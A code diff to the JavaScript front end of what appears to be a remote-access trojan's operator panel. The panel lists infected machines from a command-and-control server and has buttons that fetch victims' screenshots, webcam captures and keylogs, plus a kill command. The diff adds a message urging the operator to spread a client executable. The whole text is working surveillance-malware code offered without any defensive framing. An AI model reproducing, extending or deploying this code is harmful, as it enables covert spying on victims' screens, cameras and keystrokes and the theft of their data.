@@ -4,7 +4,7 @@ function display() {
   let sockets = JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets'))
   
   if(sockets.length == 0) {
-    document.querySelector(`#sockets`).innerHTML = "No sockets"
+    document.querySelector(`#sockets`).innerHTML = "<span>No opened sockets. Try spreading the <a href='/dl/client.exe'>client</a> !</span>"
     return
   }
   
@@ -20,7 +20,7 @@ function display() {
       <ion-icon name="desktop-outline" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
       <ion-icon name="camera-outline" onclick="image('${socket.id}', 'webcam')"></ion-icon>
       <ion-icon name="receipt-outline" onclick="text('${socket.id}', 'keylog')"></ion-icon>
-      <ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>
+      <!--<ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>-->
     </div>`
   }
 }
@@ -29,20 +29,24 @@ setInterval(() => {
   display()
 }, 1000)
 
+let loading = `<img src="cdn/loading.gif" id="loading">`
+document.querySelector('#render').innerHTML = loading
+
 function image(id, method) {
   let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
   let img = JSON.parse(get(url)).base64 || "url(assets/404.png)"
-  document.querySelector('#render').innerHTML = `<img id='render-img' src='${img}'>`
+  document.querySelector('#render').innerHTML = loading + `<img id='render-img' src='${img}'>`
 }
 
 function text(id, method) {
   let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
   let res = JSON.parse(get(url)).rawtext || "No text found"
-  document.querySelector('#render').innerHTML = `<p class="render-text">${res}</p>`
+  document.querySelector('#render').innerHTML = loading + `<p class="render-text">${res}</p>`
 }
 
 function kill(id) {
+  alert('correctly killed')
   let url = `https://gate-serv.kitsuforyou.repl.co/do/kill/${id}`
   get(url)
-  alert('correctly killed')
+  window.location.reload()
 }
